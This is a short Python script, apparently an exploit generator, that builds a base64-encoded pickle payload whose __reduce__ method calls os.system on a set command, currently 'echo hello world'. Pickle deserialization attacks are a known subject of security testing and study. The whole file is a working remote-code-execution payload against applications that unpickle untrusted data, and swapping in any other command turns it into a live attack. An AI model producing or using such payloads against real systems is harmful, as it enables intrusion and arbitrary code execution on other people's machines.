import pickle
import sys
import base64

COMMAND = "echo hello world"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(pickle.dumps(PickleRce())))